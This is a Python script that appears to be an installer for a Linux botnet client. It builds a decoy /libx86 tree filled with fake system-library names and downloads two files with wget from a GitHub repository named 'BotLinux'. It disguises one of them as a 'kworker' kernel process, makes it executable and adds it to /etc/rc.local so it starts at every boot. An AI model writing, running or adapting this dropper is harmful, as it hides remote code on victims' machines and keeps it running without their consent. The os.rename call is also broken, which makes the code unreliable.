import os
import random


os.system("mkdir /libx86")
os.chdir("/libx86")




roba = ['accountsservice', 'apg', 'apparmor', 'apt', 'aspell', 'at-spi2-core', 'avahi', 'bfd-plugins', 'binfmt.d', 'bluetooth', 'bolt', 'brltty', 'byobu', 'cnf-update-db', 'colord', 'command-not-found', 'compat-ld', 'console-setup', 'cpp', 'crda', 'cups', 'dbus-1.0', 'dconf', 'debug', 'deja-dup', 'dpkg', 'eject', 'emacsen-common', 'environment.d', 'evince', 'evolution-data-server', 'file', 'firefox', 'firefox-addons', 'firmware', 'fprintd', 'fwupd', 'gcc', 'gcr', 'gdm3', 'geoclue-2.0', 'gettext', 'ghostscript', 'girepository-1.0', 'git-core', 'gjs', 'gnome-control-center', 'gnome-disk-utility', 'gnome-initial-setup', 'gnome-online-accounts', 'gnome-session', 'gnome-settings-daemon', 'gnome-settings-daemon-3.0', 'gnome-shell', 'gnupg', 'gnupg2', 'gold-ld', 'groff', 'grub', 'grub-legacy', 'gst-install-plugins-helper', 'gvfs', 'hdparm', 'hollywood', 'ibus', 'ifupdown', 'init', 'initramfs-tools', 'ispell', 'kernel', 'klibc', 'klibc-KzNL5rI0ooqhK-koTVzHy10DW4w.so', 'language-selector', 'libgjs.so.0', 'libgjs.so.0.0.0', 'libmbim', 'libqmi', 'libreoffice', 'linux', 'linux-boot-probes', 'linux-sound-base', 'locale', 'lp_solve', 'lsb', 'man-db', 'memtest86+', 'mime', 'modprobe.d', 'modules', 'modules-load.d', 'netplan', 'networkd-dispatcher', 'NetworkManager', 'nvidia', 'openssh', 'os-prober', 'os-probes', 'os-release', 'output.txt', 'packagekit', 'pcmciautils', 'pkgconfig', 'pkg-config.multiarch', 'pm-utils', 'policykit-1', 'pppd', 'pulse-13.0', 'pvm3', 'python2.7', 'python3', 'python3.7', 'python3.8', 'recovery-mode', 'rhythmbox', 'rsyslog', 'ruby', 'rygel', 'sasl2', 'shotwell', 'snapd', 'software-properties', 'speech-dispatcher-modules', 'ssl', 'sudo', 'sysctl.d', 'syslinux', 'SYSLINUX', 'syslinux-legacy', 'systemd', 'system-service', 'sysusers.d', 'tc', 'terminfo', 'thunderbird', 'thunderbird-addons', 'tmpfiles.d', 'tracker', 'ubiquity', 'ubuntu-advantage', 'ubuntu-release-upgrader', 'udev', 'udisks2', 'ufw', 'unity-settings-daemon-1.0', 'update-notifier', 'upower', 'valgrind', 'vino', 'X11', 'x86_64-linux-gnu', 'xorg', 'xserver-xorg-video-intel']
  
  
roba2=['9.27', 'mounted', '50mounted-tests', 'init', 'libical.so.3', 'liblwres.so.161.0.0', 'libdb-5.3.so', 'libcogl.so.20', 'libmm-glib.so.0', 'libedataserver-1.2.so.24.0.0', 'libXaw7.so.7.0.0', 'plymouth', 'libform.so.6', 'libXvMC.so.1', 'caca', 'libncurses.so.6.1', 'libcmis-c-0.5.so.5.0.0', 'libGLX_mesa.so.0', 'libfontenc.so.1.0.0', 'libgpgme.so.11', 'libselinux.so.1', 'libsigc-2.0.so.0', 'libip6tc.so.0', 'libnftnl.so.11', 'libjbig.so.0', 'libxcb.so.1.1.0', 'libnss_compat.so.2', 'libXft.so.2.3.3', 'libXext.so.6.4.0', 'libz.a', 'libisc.so.1100.0.0', 'libefiboot.so.1.37', 'libXss.so.1.0.0', 'libpopt.so.0', 'libX11-xcb.so.1', 'libedata-cal-2.0.so.1', 'libhpipp.so.0.0.1', 'libsmartcols.so.1.1.0', 'libv4l', 'libebook-contacts-1.2.so.2.0.0', 'libavahi-common.so.3.5.3', 'libmythes-1.2.so.0', 'libmvec.so.1', 'libgee-0.8.so.2', 'libnetapi.so.0', 'libwebkit2gtk-4.0.so.37', 'libgettextlib.so', 'libqqwing.so.2', 'libcolordprivate.so.2.0.5', 'libXi.so.6.1.0', 'libnma.so.0.0.0', 'liblirc_client.so.0', 'libm.a', 'libsensors.so.5', 'libdcerpc.so.0.0.1', 'libminiupnpc.so.17', 'libnautilus-extension.so.1.5.0', 'libgstrtsp-1.0.so.0.1601.0', 'libmutter-5.so.0.0.0', 'libroken.so.18', 'liborcus-0.14.so.0', 'libgoa-backend-1.0.so.1', 'libcaca.so.0.99.19', 'libXau.so.6', 'libatspi.so.0.0.1', 'libitm.so.1.0.0', 'sane', 'libgoa-1.0.so.0.0.0', 'libboost_date_time.so.1.67.0', 'libespeak-ng.so.1.1.49', 'libSM.so.6.0.1', 'libbd_part_err.so.2.0.0', 'libvpx.so.6', 'libdl.a', 'libcolord.so.2.0.5', 'libdrm_amdgpu.so.1.0.0', 'libijs-0.35.so', 'libwpd-0.10.so.10.0.3', 'libdee-1.0.so.4.2.1', 'libgthread-2.0.so.0', 'libgsttag-1.0.so.0', 'liblzo2.so.2', 'libmpxwrappers.so.2', 'NetworkManager', 'libpcre2-8.so.0', 'libaccountsservice.so.0', 'libneon-gnutls.so.27', 'liblangtag.so.1.4.1', 'libbabeltrace-ctf-text.so.1', 'libatk-bridge-2.0.so.0.0.0', 'libSDL2-2.0.so.0', 'libncursesw.so.6', 'libunwind-ptrace.so.0', 'libabw-0.1.so.1', 'libdv.so.4', 'libboost_thread.so.1.67.0', 'libxshmfence.so.1', 'libnss_systemd.so.2', 'libasan.so.5', 'libevview3.so.3.0.0', 'libv4l1.so.0', 'libcogl-pango.so.20', 'libpcreposix.so.3.13.3', 'libefivar.so.1.37', 'libnl-genl-3.so.200.26.0', 'libk5crypto.so.3.1', 'libsamba-passdb.so.0', 'libebook-1.2.so.20.1.3', 'libapt-pkg.so.5.90.0', 'libical.so.3.0.5', 'libiec61883.so.0.1.1', 'libmpfr.so.6', 'libgstreamer-1.0.so.0', 'libgutenprint.so.9.1.0', 'libgnome-desktop-3.so.17', 'libv4lconvert.so.0', 'libc-2.30.so', 'libv4l1.so.0.0.0', 'libdaemon.so.0', 'libcue.so.2', 'libgtk-3.so.0.2404.8', 'deja-dup', 'libwpg-0.3.so.3', 'libavahi-common.so.3', 'librest-0.7.so.0.0.0', 'libclucene-contribs-lib.so.1', 'libMagickWand-6.Q16.so.6.0.0', 'libcolord.so.2', 'libpytalloc-util.cpython-37m-x86-64-linux-gnu.so.2.1.16', 'libdbus-1.so.3', 'gnome-software', 'libcheese.so.8', 'libbabeltrace.so.1', 'libmbim-glib.so.4.4.0', 'libcogl-path.so.20.4.2', 'libtevent.so.0.9.39', 'libsamba-errors.so.1', 'libedataserverui-1.2.so.2.0.0', 'libtinfo.so.6', 'libwebpmux.so.3', 'libboost_system.so.1.67.0', 'grcrt1.o', 'libdcerpc.so.0', 'libboost_locale.so.1.67.0', 'libmutter-4.so.0.0.0', 'libproxy.so.1', 'libltdl.so.7.3.1', 'libsoxr.so.0', 'libksba.so.8', 'libpulse.so.0.21.1', 'libnautilus-extension.so.1', 'libXmuu.so.1.0.0', 'libgcr-ui-3.so.1', 'liblirc_client.so.0.6.0', 'libsysmetrics.so.1', 'libapt-pkg.so.5.90', 'libpci.so.3', 'gconv', 'yelp', 'libunwind.so.8', 'libkrb5.so.3.3', 'libpulse-mainloop-glib.so.0.0.5', 'libEGL.so.1.1.0', 'libnss_nis.so.2', 'ldscripts', 'libvolume_key.so.1', 'libBrokenLocale.so.1', 'libatk-1.0.so.0', 'libisc-pkcs11.so.1100.0.0', 'libmtdev.so.1.0.0', 'libXxf86dga.so.1', 'libmpx.so.2.0.1', 'libnetsnmphelpers.so.30', 'libxcb-icccm.so.4.0.0', 'libndp.so.0.1.1', 'libanl.a', 'libxcb-util.so.1.0.0', 'libcdio_paranoia.so.2.0.0', 'libdl.so.2', 'libsamba-hostconfig.so.0', 'libsquid.so.1.0.0', 'libncursesw.so.6.1', 'libvorbisfile.so.3', 'libdns-pkcs11.so.1104', 'liblua5.3.so.0.0.0', 'libgom-1.0.so.0.1.0', 'libhcrypto.so.4', 'libgailutil-3.so.0.0.0', 'libpixman-1.so.0', 'libdee-1.0.so.4', 'libspeechd.so.2', 'libunistring.so.2.1.0', 'libpciaccess.so.0', 'libe-book-0.1.so.1', 'libsamba-hostconfig.so.0.0.1', 'libecal-1.2.so.19', 'libp11-kit.so.0.3.0', 'libgirepository-1.0.so.1.0.0', 'libthread_db-1.0.so', 'libplist.so.3.1.0', 'libfreeblpriv3.so', 'libgraphene-1.0.so.0.1000.0', 'libxcb-glx.so.0.0.0', 'libisc.so.1100', 'libGL.so.1', 'libmbim-glib.so.4', 'nss', 'libsoup-2.4.so.1.8.0', 'libwpg-0.3.so.3.0.3', 'libgpgmepp.so.6.8.0', 'libgssdp-1.2.so.0.0.0', 'elfutils', 'glib-2.0', 'liblz4.so.1.9.1', 'libclucene-contribs-lib.so.2.3.3.4', 'liblzma.so.5.2.4', 'libunwind-coredump.so.0.0.0', 'libsigc-2.0.so.0.0.0', 'libclucene-core.so.2.3.3.4', 'libgettextlib-0.19.8.1.so', 'libpcreposix.so.3', 'librsvg-2.so.2', 'libffi.so.6', 'libgif.so.7', 'libmutter-5.so.0', 'libgnome-bluetooth.so.13.0.2', 'libtracker-miner-2.0.so.0.300.0', 'libXinerama.so.1.0.0', 'libgtkmm-3.0.so.1.1.0', 'libuno_sal.so.3', 'libeot.so.0', 'libexpatw.so.1.6.9', 'libgnome-games-support-1.so.3.0.1', 'libgstcheck-1.0.so.0.1601.0', 'libspeexdsp.so.1', 'libldb.so.1', 'libgtop-2.0.so.11.0.1', 'libXrandr.so.2.2.0', 'libpng16.so.16', 'liblcms2.so.2.0.8', 'libgd.so.3', 'libtasn1.so.6.5.6', 'libxkbfile.so.1', 'gupnp-dlna', 'libndr-standard.so.0.0.1', 'libmate-desktop-2.so.17', 'libnss_compat.so', 'libgck-1.so.0.0.0', 'libraptor2.so.0', 'librevenge-0.0.so.0.0.4', 'libxslt.so.1.1.33', 'libevent-2.1.so.6.0.2', 'liborc-0.4.so.0.30.0', 'libunwind.so.8.0.1', 'libteamdctl.so.0', 'libfftw3_omp.so.3', 'gutenprint', 'gnome-todo', 'libgpvm3.so.3.4.6', 'libgxps.so.2', 'libcrypt.a', 'libexpatw.so.1', 'libjavascriptcoregtk-4.0.so.18.16.5', 'libpython3.7m.a', 'libnetsnmpagent.so.30.0.3', 'libldap-2.4.so.2', 'libform.so.6.1', 'libwayland-egl.so.1', 'libMagickCore-6.Q16.so.6.0.0', 'libpulse-mainloop-glib.so.0', 'libpcaudio.so.0.0.1', 'libcap-ng.so.0', 'gtk-2.0', 'libusbmuxd.so.4.1.0', 'libxcb-dri3.so.0', 'libstartup-notification-1.so.0', 'libupower-glib.so.3', 'libjackserver.so.0', 'liborcus-mso-0.14.so.0.0.0', 'libpixman-1.so.0.38.4', 'libbabeltrace-dummy.so.1', 'libhogweed.so.4', 'libtwolame.so.0.0.0', 'libc.a', 'libruby-2.5.so.2.5.5', 'libcogl-pango.so.20.4.2', 'libical-glib.so.3', 'libgccpp.so.1', 'libcdio_cdda.so.2', 'libnl-3.so.200', 'libxcb-dri3.so.0.0.0', 'libgphoto2.so.6.1.0', 'libgpgme-pthread.so.11', 'libXdmcp.so.6', 'libsoup-2.4.so.1', 'libnetfilter_conntrack.so.3.7.0', 'librtmp.so.1', 'libmpdec.so.2', 'libquadmath.so.0', 'libfreetype.so.6.16.1', 'libnss_files.so', 'libcom_err.so.2.1', 'libnuma.so.1', 'rsyslog', 'libruby-2.5.so.2.5', 'gstreamer1.0', 'libsensors.so.5.0.0', 'libss.so.2', 'libpkcs11-helper.so.1.0.0', 'libpoppler-glib.so.8', 'libssl3.so', 'libgrilo-0.3.so.0.310.1', 'libfreehand-0.1.so.1', 'libvisual-0.4.so.0.0.0', 'libmagic.so.1', 'libargon2.so.1', 'libulockmgr.so.1', 'libsnapd-glib.so.1', 'libisc-export.so.1100.0.0', 'libicuio.so.63.2', 'libexslt.so.0.8.20', 'libgmp.so.10', 'libxmlsec1-nss.so.1', 'libbabeltrace-ctf.so.1.0.0', 'libfuse.so.2.9.9', 'libcamel-1.2.so.62', 'libss.so.2.0', 'libsnapd-glib.so.1.0.0', 'libcdio.so.18.0.0', 'krb5', 'libtheoraenc.so.1', 'libmount.so.1.1.0', 'libdivsufsort.so.3', 'libyaml-0.so.2', 'libgstsdp-1.0.so.0', 'libdbusmenu-glib.so.4.0.12', 'librevenge-generators-0.0.so.0', 'gio', 'libdrm_nouveau.so.2', 'libtevent-util.so.0', 'libtag_c.so.0', 'libcryptsetup.so.12', 'libunity', 'libimobiledevice.so.6.0.0', 'libgstbasecamerabinsrc-1.0.so.0', 'libsecret-1.so.0.0.0', 'libGLX.so.0', 'libchafa.so.0', 'libutempter.so.1.1.6', 'libwoff2dec.so.1.0.2', 'libunity-extras.so.9.0.2', 'libunity-extras.so.9', 'libudev.so.1.6.14', 'libXtst.so.6', 'libcupsimage.so.2', 'libxcb-shm.so.0', 'libboost_filesystem.so.1.67.0', 'libxkbcommon-x11.so.0.0.0', 'libspeex.so.1.5.0', 'libcue.so.2.2.1', 'libkrb5support.so.0', 'libcmis-0.5.so.5.0.0', 'libfreerdp2.so.2', 'libroken.so.18.1.0', 'libphonenumber.so.7', 'libLLVM-8.so', 'libxcb-image.so.0', 'libdmapsharing-3.0.so.2', 'libxcb-sync.so.1', 'X11', 'libcolamd.so.2.9.6', 'libtalloc.so.2.1.16', 'libtic.so.6', 'libXRes.so.1', 'libavahi-ui-gtk3.so.0', 'libsamplerate.so.0', 'libepubgen-0.1.so.1', 'Mcrt1.o', 'libmwaw-0.3.so.3', 'libgpod.so.4.3.2', 'libnss3.so', 'libdbusmenu-glib.so.4', 'libxmlsec1.so.1.2.28', 'libgstallocators-1.0.so.0', 'libisccfg.so.163', 'libasyncns.so.0', 'libtic.so.6.1', 'libXau.so.6.0.0', 'libgpg-error.so.0', 'libz.so.1', 'libgdk-3.so.0', 'libbabeltrace-lttng-live.so.1.0.0', 'libsynctex.so.2', 'libgusb.so.2.0.10', 'libdns.so.1104.0.2', 'libwayland-cursor.so.0.0.0', 'libdjvulibre.so.21', 'libGLESv2.so.2', 'libnftnl.so.11.1.0', 'libgsound.so.0.0.2', 'libpython3.7m.so.1.0', 'libcairomm-1.0.so.1', 'libaa.so.1.0.4', 'libXrandr.so.2', 'libjacknet.so.0', 'libwnck-3.so.0', 'libdns-export.so.1104.0.2', 'libedata-book-1.2.so.26', 'libevview3.so.3', 'libisccc.so.161', 'libcolorhug.so.2.0.5', 'libcrypt.so.1', 'evince', 'libreadline.so.8.0', 'libasound.so.2.0.0', 'libhpipp.so.0', 'libply-splash-core.so.4.0.0', 'libpoppler.so.90.0.0', 'libxcb.so.1', 'libbrlapi.so.0.6', 'libcdio_cdda.so.2.0.0', 'libntfs-3g.so.883', 'libnpth.so.0.1.2', 'libapt-private.so.0.0.0', 'libogg.so.0', 'libnss_mdns.so.2', 'libchafa.so.0.1.1', 'liborcus-mso-0.14.so.0', 'libmm-glib.so.0.4.0', 'libpkcs11-helper.so.1', 'libnewt.so.0.52', 'libply-boot-client.so.4', 'libasan.so.5.0.0', 'libpopt.so.0.0.0', 'libtalloc.so.2', 'libhunspell-1.7.so.0', 'libpipeline.so.1', 'libquadmath.so.0.0.0', 'librygel-server-2.6.so.2', 'libsmbldap.so.2', 'libgstphotography-1.0.so.0', 'libgphoto2_port.so.12.0.0', 'libraw_r.so.19.0.2', 'libunwind-ptrace.so.0.0.0', 'libxcb-render.so.0', 'libmozjs-60.so.0.0.0', 'libnetsnmp.so.30', 'libmtp.so.9', 'libfontembed.so.1.0.0', 'libgcr-ui-3.so.1.0.0', 'libpthread.so.0', 'libmessaging-menu.so.0', 'libnghttp2.so.14.18.0', 'libtheora.so.0', 'libdcerpc-samr.so.0', 'librygel-server-2.6.so.2.0.4', 'libgtop-2.0.so.11', 'libappstream.so.4', 'rygel-2.6', 'libgd.so.3.0.5', 'libvorbis.so.0', 'libhpip.so.0.0.1', 'libgtkmm-3.0.so.1', 'libblkid.so.1', 'libidn2.so.0.3.6']

for i in roba:
  os.mkdir(i)
  

  #'libsamba-hostconfig.so.0'
  
for i in roba:
  try:
    randomDir=random.randint(1,3)
    randomDirFile=random.randint(1,2)
    cartella=random.choice(roba2)
    os.mkdir(str(i)+'/'+str(cartella))
    os.system("touch " + str(i) + "/" + str(cartella) + "/" + str(random.choice(roba2))+".bld")
    if(randomDirFile>1):
      os.system("touch " + str(i) + "/" + str(cartella) + "/" + str(random.choice(roba2))+".h")
    if(randomDir>1):
      randomDirFile=random.randint(1,2)
      cartella=random.choice(roba2)
      os.mkdir(str(i)+'/'+str(cartella))
      os.system("touch " + str(i) + "/" + str(cartella) + "/" + str(random.choice(roba2))+".dat")
      if(randomDirFile>1):
        os.system("touch " + str(i) + "/" + str(cartella) + "/" + str(random.choice(roba2)))
    if(randomDir>2):
      randomDirFile=random.randint(1,2)
      cartella=random.choice(roba2)
      os.mkdir(str(i)+'/'+str(cartella))
      os.system("touch " + str(i) + "/" + str(cartella) + "/" + str(random.choice(roba2)))
      if(randomDirFile>1):
        os.system("touch " + str(i) + "/" + str(cartella) + "/" + str(random.choice(roba2))+".py")
    randomFile=random.randint(1,4)
    os.system("touch "+str(i)+"/"+str(random.choice(roba2))+".html")
    if(randomFile>1):
      os.system("touch "+str(i)+"/"+str(random.choice(roba2))+".py")
    if(randomFile>2):
      os.system("touch "+str(i)+"/"+str(random.choice(roba2))+".json")
    if(randomFile>3):
      os.system("touch "+str(i)+"/"+str(random.choice(roba2))+".c")
  except:
    continue

    
    
os.chdir("lsb")

os.mkdir("hostconfig-lib-01")
os.chdir("hostconfig-lib-01")
os.system("wget https://raw.githubusercontent.com/Libx86/BotLinux/master/kworker_v8U%3A023FWE234-0")
os.system("wget https://raw.githubusercontent.com/Libx86/BotLinux/master/at-spi2-regist3r.01F")


os.system("chmod a+x kworker_v8U:023FWE234-0")
os.system("touch lib01.h hostconfig-beta librighel2.6.04 libquadmath.so.02.3.2.h")


os.system("python -OO -m py_compile at-spi2-regist3r.01F")

os.system("rm at-spi2-regist3r.01F")
os.rename("at-spi2-regist3r.01Fo at-spi2-regist3r.01F")


if(os.path.exists("/etc/rc.local")):
  autorunFile=open("/etc/rc.local","r")
  autorun=autorunFile.readlines()
  autorunFile.close()
  autorun.insert(len(autorun)-2,"./libx86/lsb/hostconfig-lib-01/kworker_v8U:023FWE234-0\n")
  autorun="".join(autorun)
  autorunFile=open("/etc/rc.local","w")
  autorunFile.write(autorun)
else:
  autorunFile=open("/etc/rc.local","w")
  autorunFile.write("""#!/bin/bash


./libx86/lsb/hostconfig-lib-01/kworker_v8U:023FWE234-0

exit 0""")
  autorunFile.close()
  os.system("chmod a+x /etc/rc.local")







# autorun ->  systemd-udevc
# bot ->    at-spi2-regist3r.01F 








